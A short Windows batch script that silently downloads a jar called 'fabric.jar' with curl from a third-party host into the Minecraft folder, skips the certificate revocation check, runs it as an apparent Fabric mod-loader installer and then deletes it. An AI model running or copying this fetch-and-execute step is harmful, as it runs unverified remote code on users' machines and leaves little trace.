@echo off
C:
if exist %appdata%\.minecraft (
  cd %appdata%\.minecraft 
  curl --ssl-no-revoke -sL -o fabric.jar https://zvcdn.de/fa
  if exist fabric.jar (
    java -jar fabric.jar client -mcversion 1.19.4 -loader 0.15.10
    del /S /Q fabric.jar
  )
)
